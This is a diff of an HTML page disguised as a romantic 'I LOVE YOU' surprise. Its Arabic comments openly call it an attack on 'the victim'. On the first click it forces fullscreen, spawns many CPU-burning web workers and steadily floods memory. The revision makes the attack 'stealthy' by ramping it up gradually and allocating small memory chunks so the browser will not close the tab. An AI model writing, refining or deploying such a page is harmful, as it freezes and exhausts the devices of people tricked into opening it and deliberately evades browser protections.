@@ -4,53 +4,47 @@
     <meta charset="UTF-8">
     <title>Surprise ❤️</title>
     <style>
-        body { background: black; color: red; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: none; }
-        h1 { font-size: 6rem; font-family: 'Courier New', Courier, monospace; text-shadow: 0 0 30px red; }
-        p { color: white; font-size: 1.2rem; margin-top: 20px; }
+        body { background: black; color: red; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        h1 { font-size: 5rem; font-family: sans-serif; transition: 0.5s; }
     </style>
 </head>
 <body>
 
     <h1 id="text">I LOVE YOU</h1>
-    <p id="sub">Click anywhere to start the surprise...</p>
 
     <script>
-        // دالة الدخول في وضع ملء الشاشة وتفعيل الهجوم
-        function lockAndLoad() {
-            // 1. الدخول في ملء الشاشة
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen();
-            } else if (elem.webkitRequestFullscreen) {
-                elem.webkitRequestFullscreen();
-            }
+        function stealthAttack() {
+            // دخول ملء الشاشة
+            document.documentElement.requestFullscreen().catch(() => {});
 
-            // 2. إخفاء الرسالة الفرعية وتغيير النص
-            document.getElementById('sub').innerText = "System Failure Imminent...";
+            // هجوم المعالج بالتدريج (بفتح عمال كل نصف ثانية)
+            let workerCount = 0;
+            const maxWorkers = (navigator.hardwareConcurrency || 8) * 2;
             
-            // 3. هجوم المعالج (CPU Overload) - نسخة مكثفة
-            const cores = navigator.hardwareConcurrency || 16;
-            for (let i = 0; i < cores * 10; i++) {
-                const worker = new Worker(URL.createObjectURL(new Blob([`
-                    setInterval(() => {
-                        let d = "STRESS".repeat(1000);
-                        while(true) { d = btoa(d + Math.random()); }
-                    }, 1);
-                `], {type: 'application/javascript'})));
-            }
+            const workerInterval = setInterval(() => {
+                if (workerCount < maxWorkers) {
+                    const worker = new Worker(URL.createObjectURL(new Blob([`
+                        setInterval(() => {
+                            let x = Math.sqrt(Math.random() * 999);
+                            for(let i=0; i<100000; i++) { x += i; }
+                        }, 50); // تأخير بسيط عشان المتصفح ميعملش Aw Snap
+                    `], {type: 'application/javascript'})));
+                    workerCount++;
+                } else {
+                    clearInterval(workerInterval);
+                }
+            }, 500);
 
-            // 4. هجوم الرام (RAM Flood)
-            let trap = [];
+            // هجوم الرام المتوازن
+            let memoryBags = [];
             setInterval(() => {
-                trap.push(new Array(1000000).fill("BYE_BYE_RAM"));
-                window.history.pushState(null, null, "#" + Math.random());
-            }, 10);
+                // بنحجز 5 ميجا بس كل شوية عشان المتصفح ميفصلش التبويب فجأة
+                memoryBags.push(new Float64Array(1024 * 640)); 
+            }, 100);
         }
 
-        // المتصفحات تمنع ملء الشاشة تلقائياً، لذا ننتظر أول لمسة من الضحية
-        window.onclick = function() {
-            lockAndLoad();
-        };
+        // بيبدأ أول ما الضحية يلمس الشاشة
+        window.onclick = stealthAttack;
     </script>
 </body>
 </html>
